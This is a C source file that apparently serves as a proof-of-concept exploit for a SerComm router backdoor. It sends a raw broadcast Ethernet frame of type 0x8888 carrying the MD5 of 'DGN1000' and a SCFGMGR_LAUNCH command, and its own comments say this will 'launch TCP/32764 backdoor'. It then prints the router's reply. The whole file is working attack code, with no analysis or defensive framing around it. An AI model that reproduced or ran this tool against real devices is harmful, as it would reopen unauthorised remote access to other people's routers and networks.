#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <arpa/inet.h>
 
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
 
#define ETH_P_NFTP      0x8888
 
enum backdoor_command {
    PING_BACKDOOR = 0x200,
    SCFGMGR_LAUNCH,
    SET_IP
};
 
struct ether_header
{
    unsigned char ether_dhost[ETH_ALEN];
    unsigned char ether_shost[ETH_ALEN];
    unsigned short ether_type;
} eth;
 
struct raw_packet {
    struct ether_header header;
    uint16_t            type;
    uint16_t            sequence;
    uint16_t            offset;
    uint16_t            chunk;
    uint16_t            payload_len;
    uint8_t             payload[528];
};
 
int main(int argc, char *argv[])
{
    int sockfd, res, i, len;
    char src_mac[ETH_ALEN];
    struct ifreq iface;
    struct sockaddr_ll socket_address;
    struct raw_packet packet;
 
    memset(&packet, 0, sizeof(packet));
 
    if (argc < 2)
    {
        fprintf(stderr, "usage : %s [IFNAME]\n", argv[0]);
        exit(1);
    }
 
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd == -1)
    {
        if(geteuid() != 0)
        {
            fprintf(stderr, "You should probably run this program as root.\n");
        }
        perror("socket");
        exit(1);
    }
    seteuid(getuid());
 
    strncpy(iface.ifr_name, argv[1], IFNAMSIZ);
    res = ioctl(sockfd, SIOCGIFHWADDR, &iface);
    if(res < 0)
    {
        perror("ioctl");
        exit(1);
    }
    memcpy(src_mac, iface.ifr_hwaddr.sa_data, ETH_ALEN);
 
 
    res = ioctl(sockfd, SIOCGIFINDEX, &iface);
    if(res < 0)
    {
        perror("ioctl");
        exit(1);
    }
 
    // set src mac
    memcpy(packet.header.ether_shost, src_mac, ETH_ALEN);
    // broadcast
    memset(packet.header.ether_dhost, 0xFF, ETH_ALEN);
    // MD5("DGN1000")
    memcpy(packet.payload, "\x45\xD1\xBB\x33\x9B\x07\xA6\x61\x8B\x21\x14\xDB\xC0\xD7\x78\x3E", 0x10);
    packet.payload_len = htole16(0x10);
    // ethernet packet type = 0x8888
    packet.header.ether_type = htons(ETH_P_NFTP);
    // launch TCP/32764 backdoor
    packet.type = htole16(SCFGMGR_LAUNCH);
 
    socket_address.sll_family   = PF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_NFTP);
    socket_address.sll_ifindex  = iface.ifr_ifindex;
    socket_address.sll_hatype   = ARPHRD_ETHER;
    socket_address.sll_pkttype  = PACKET_OTHERHOST;
    // broadcast
    socket_address.sll_halen = ETH_ALEN;
    memset(socket_address.sll_addr, 0xFF, ETH_ALEN);
 
    res = sendto(sockfd, &packet, 0x10 + 24, 0, (struct sockaddr *)&socket_address, sizeof(socket_address));
    if (res == -1)
    {
        perror("sendto");
        exit(1);
    }
 
    do {
        memset(&packet, 0, sizeof(packet));
        res = recvfrom(sockfd, &packet, sizeof(packet), 0, NULL, NULL);
        if (res == -1)
        {
            perror("recvfrom");
            exit(1);
        }
    } while (ntohs(packet.header.ether_type) != ETH_P_NFTP);
 
    if (res < sizeof(packet) - sizeof(packet.payload))
    {
        fprintf(stderr, "packet is too short: %d bytes\n", res);
        exit(1);
    }
 
    len = be16toh(packet.payload_len); // SerComm has a real problem with endianness
    printf("received packet: %d bytes (payload len = %d) from ", res, len);
    for (i = 0; i < ETH_ALEN; i++)
        printf("%02X%c", packet.header.ether_shost[i], i == ETH_ALEN-1 ? '\n' : ':');
 
    for (i = 0; (i < len) && (i < sizeof(packet.payload)); i++)
    {
        printf("%02X ", packet.payload[i]);
        if ((i+1) % 16 == 0)
            printf("\n");
    }
    printf("\n");
    return 0;
}
